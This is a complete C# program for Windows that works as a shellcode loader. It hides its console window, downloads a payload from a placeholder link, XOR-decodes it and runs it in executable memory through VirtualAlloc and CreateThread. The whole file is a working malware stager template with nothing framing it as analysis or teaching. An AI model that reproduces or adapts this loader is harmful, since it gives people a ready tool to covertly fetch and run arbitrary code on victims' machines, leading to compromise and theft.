using System;
using System.Net;
using System.Runtime.InteropServices;

internal class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    private static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private const int SW_HIDE = 0;

    private static void Main()
    {
        // Hide the console window
        IntPtr handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        byte[] shellcode;
        using (WebClient webClient = new WebClient())
        {
            try
            {
                shellcode = webClient.DownloadData("[downloadlink]");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to download: " + ex.Message);
                return;
            }
        }

        IntPtr allocatedMemory = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
        if (allocatedMemory == IntPtr.Zero)
        {
            Console.WriteLine("Failed to allocate memory.");
            return;
        }

        // Obfuscate memory by XOR-ing the shellcode
        XorEncrypt(shellcode);

        // Copy shellcode to allocated memory
        Marshal.Copy(shellcode, 0, allocatedMemory, shellcode.Length);

        // Create a thread to execute the shellcode
        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0U, allocatedMemory, IntPtr.Zero, 0U, IntPtr.Zero);
        if (threadHandle == IntPtr.Zero)
        {
            Console.WriteLine("Failed to create thread.");
            return;
        }

        WaitForSingleObject(threadHandle, uint.MaxValue);
        VirtualFree(allocatedMemory, 0U, 32768U); // MEM_RELEASE = 0x8000

        Console.WriteLine(" executed successfully.");
    }

    private static void XorEncrypt(byte[] data, byte key = 0xAA)
    {
        for (int i = 0; i < data.Length; i++)
        {
            data[i] ^= key;
        }
    }

    [Flags]
    private enum AllocationType
    {
        Commit = 4096,
        Reserve = 8192,
    }

    [Flags]
    private enum MemoryProtection
    {
        ExecuteReadWrite = 64
    }
}
